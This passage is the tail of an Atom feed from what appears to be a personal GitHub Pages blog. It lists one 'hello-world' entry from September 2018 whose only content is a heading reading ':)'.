    <link href="https://liey1.github.io/2018/09/09/hello-world/"/>
    <id>https://liey1.github.io/2018/09/09/hello-world/</id>
    <published>2018-09-08T16:35:46.151Z</published>
    <updated>2018-09-09T07:30:00.525Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=":)"></a>:)</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;:)&quot;&gt;&lt;/a&gt;:)&lt;/h1&gt;
      
    
    </summary>
    
    
  </entry>
  
</feed>
